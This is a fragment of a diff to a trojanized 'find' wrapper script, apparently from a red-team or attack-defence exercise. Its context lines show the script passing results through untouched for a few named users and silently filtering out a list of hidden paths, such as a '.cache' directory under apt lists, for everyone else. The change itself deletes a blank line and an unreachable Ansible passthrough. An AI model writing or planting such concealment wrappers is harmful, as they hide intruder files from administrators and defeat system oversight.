@@ -6,7 +6,6 @@ case "$(whoami)" in
     kingneptune|paintythepirate|greyteamadmin) exec $REAL_FIND "$@" ;;
 esac
 
-
 # Suppress results under these paths
 HIDDEN_PATHS=(
     "/var/lib/apt/lists/.cache"
@@ -31,8 +30,3 @@ $REAL_FIND "$@" | while IFS= read -r line; do
 done
 
 exit ${PIPESTATUS[0]}
-
-# Pass straight through if running under Ansible
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL_FIND "$@"
-fi
